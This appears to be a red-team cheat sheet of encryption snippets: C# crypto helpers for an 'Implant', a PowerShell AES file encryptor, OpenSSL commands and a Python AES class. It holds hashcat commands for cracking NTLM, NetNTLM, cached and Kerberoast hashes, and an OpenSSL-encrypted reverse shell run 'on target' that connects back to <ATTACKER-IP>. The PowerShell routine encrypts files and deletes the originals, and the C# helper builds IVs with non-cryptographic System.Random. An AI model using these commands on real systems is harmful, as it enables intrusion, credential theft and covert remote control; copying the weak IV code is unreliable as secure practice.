#### AES MANAGED SMALL
```cs
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Implant.Exceptions; // remove ...

public static class SmallCrypto
{
    public static byte[] rsaEncrypt(byte[] bytes, string publicKey)
    {
        byte[] ret = null;
        try
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    rsa.FromXmlString(publicKey);
                    ret = rsa.Encrypt(bytes, true);
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }
        catch (Exception e)
        {
            throw new ImplantException(e.Message, "ImplantCryptography - rsaEncrypt");
        }

        return ret;
    }

    public static byte[] rsaDecrypt(byte[] bytes, string privateKey)
    {
        byte[] ret = null;
        try
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    rsa.FromXmlString(privateKey);
                    ret = rsa.Decrypt(bytes, true);
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }
        catch (Exception e)
        {
            throw new ImplantException(e.Message, "ImplantCryptography - rsaEncrypt");
        }

        return ret;
    }

    public static byte[] encrypt(byte[] bytes, string phrase)
    {
        byte[] iv = new byte[16];
        byte[] key = new byte[32];
        byte[] ret = null;

        try
        {
            Array.Copy(
                Encoding.UTF8.GetBytes(phrase),
                key,
                32
            );
            iv = generateIV();

            using (AesManaged algorithm = new AesManaged() { IV = iv, Key = key })
            {
                using (var encryptor = algorithm.CreateEncryptor(algorithm.Key, algorithm.IV))
                {
                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            using (BinaryWriter swEncrypt = new BinaryWriter(csEncrypt))
                            {
                                msEncrypt.Write(iv, 0, 16);
                                swEncrypt.Write(bytes, 0, bytes.Length);
                                csEncrypt.FlushFinalBlock();
                            }

                            ret = msEncrypt.ToArray();
                        }
                    }
                }
            }

        }
        catch (Exception e)
        {
            throw new ImplantException(e.Message, "ImplantCryptography - encrypt");
        }

        return ret;
    }

    public static byte[] decrypt(byte[] bytes, string phrase)
    {
        byte[] iv = new byte[16];
        byte[] key = new byte[32];
        byte[] ret = null;

        try {
            Array.Copy(
                Encoding.UTF8.GetBytes(phrase),
                key,
                32
            );
            Array.Copy(
                bytes,
                iv,
                16
            );

            using (AesManaged algorithm = new AesManaged() { IV = iv, Key = key })
            {
                using (var decryptor = algorithm.CreateDecryptor())
                {
                    using (MemoryStream msDecrypted = new MemoryStream())
                    {
                        using (CryptoStream csEncrypt = new CryptoStream(msDecrypted, decryptor, CryptoStreamMode.Write))
                        {
                            csEncrypt.Write(bytes, 16, bytes.Length - 16);
                        }
                        ret = msDecrypted.ToArray();
                    }
                }
            }
        }
        catch (Exception e)
        {
            throw new ImplantException(e.Message, "ImplantCryptography - decrypt");
        }
        return ret;
    }

    public static byte[] generateIV()
    {
        var rnd = new Random();
        byte[] bytes = new byte[16];
        rnd.NextBytes(bytes);

        return bytes;
    }
}

```

#### AES LARGE
```ps1

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;

    public static class Crypto
    {
        public static void Main(string[] args)
        {
            String usage = "Usage: powershell -file ./crypto.ps1 -opt encrypt|decrypt -file file -pass password";
            if(args.Length.Equals(3))
            {
                String option = args[0];
                String inputFile = args[1];
                String password = args[2];

                switch(option.ToLower())
                {
                    case "encrypt":
                        AES_Encrypt(inputFile, password);
                        break;
                    case "decrypt":
                        AES_Decrypt(inputFile, password);
                        break;
                    default:
                        Console.WriteLine(usage);
                        break;
                }
            } else
                Console.WriteLine(usage);
        }

        private static void AES_Encrypt(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();
            FileStream fsCrypt = new FileStream(inputFile + ".aes", FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;

            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }
                fsIn.Close();

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);
            }
        }

        private static void AES_Decrypt(string inputFile, string password)
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);
            fsCrypt.Read(salt, 0, salt.Length);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.PKCS7;
            AES.Mode = CipherMode.CFB;

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(inputFile + ".decrypted", FileMode.Create);
            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    fsOut.Write(buffer, 0, read);
                }
            }
            catch (System.Security.Cryptography.CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fsOut.Close();
                fsCrypt.Close();

                File.Move(inputFile+".decrypted", inputFile.Remove(inputFile.Length - 4));
                File.Delete(inputFile);
            }
        }

        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }
    }
"@

function Crypto
{
    param
    (
        [string] $Option = "encrypt",
        [string] $Destination = "",
        [string] $Passwd = ""
    )
    try {

        $Params = @($Option, $Destination, $Passwd)
        [Crypto]::Main($Params)

    } catch {
        Write-Output "Error: $($error[0])"
    }
}

```
#### HASHCAT
```sh
hashcat -m 1000 -a 0 lmhash_nthash.txt /root/Desktop/crackstation-human-realhuman_phill.txt --force
hashcat -m 5500 -a 0 ntlmv1.txt /root/Desktop/crackstation-human-realhuman_phill.txt --force
hashcat -m 5600 -a 0 ntlmv2.txt /root/Desktop/crackstation-human-realhuman_phill.txt --force
hashcat -m 2100 -a 0 cached.txt /root/Desktop/crackstation-human-realhuman_phill.txt --force
hashcat -m 13100 -a 0 spns.txt /root/Desktop/crackstation-human-realhuman_phill.txt --force
```
### BASH OPENSSL
```sh
# Encrypt STDIN and provide a password(prompt)
echo "message" | openssl enc -aes-256-cbc -a

# Decrypt STDIN and provide a password(prompt)
echo "encrypted" | openssl enc -aes-256-cbc -a -d

# cert on kali and listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>

# on target (upload cert.pem)
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -CAfile /tmp/cert.pem -verify_return_error -verify 1 -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s

## ENCRYPT
openssl enc -aes-256-cbc -salt -in file.txt -out file.txt.enc -k PASS

### DECRYPT
openssl enc -aes-256-cbc -d -in file.txt.enc -out file.txt -k PASS

# https://gist.github.com/dreikanter/c7e85598664901afae03fedff308736b
```

#### PY
```py
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

class AESCipher(object):

    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]
```
